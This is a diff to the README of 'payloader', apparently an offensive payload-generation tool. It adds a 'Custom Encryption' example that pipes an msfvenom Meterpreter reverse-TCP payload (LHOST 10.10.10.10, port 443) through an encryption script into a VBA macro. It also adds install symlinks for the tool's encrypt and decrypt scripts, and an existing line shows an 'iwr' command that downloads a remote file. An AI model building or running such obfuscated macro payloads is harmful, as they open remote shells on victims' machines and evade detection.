@@ -24,6 +24,12 @@ or
 payloader example.ps1 -f ps1 -o test -p "iwr http://test.com/test -o test"
 ```
 
+## Custom Encryption 
+
+```bash
+msfvenon -p windows/x64/meterpreter/reverse_tcp LPORT=443 LHOST=10.10.10.10 -f ps1 | payloader_encrypt --encryption ff --key 5 --lang vba< | payloader -f vba -o test
+```
+
 
 # Install
 
@@ -32,6 +38,8 @@ git clone https://github.com/desterhuizen/payloader.git
 cd payloader
 virtualenv .venv
 ln -s $(realpath ./payloader.py) ~/.local/bin/payloader
+ln -s $(realpath ./payloader_encrypt.py) ~/.local/bin/payloader_encrypt
+ln -s $(realpath ./payloader_decrypt.py) ~/.local/bin/payloader_decrypt
 git submodule add <YOUR PAYLOADS REPO> templates
 git submodule init
 ```
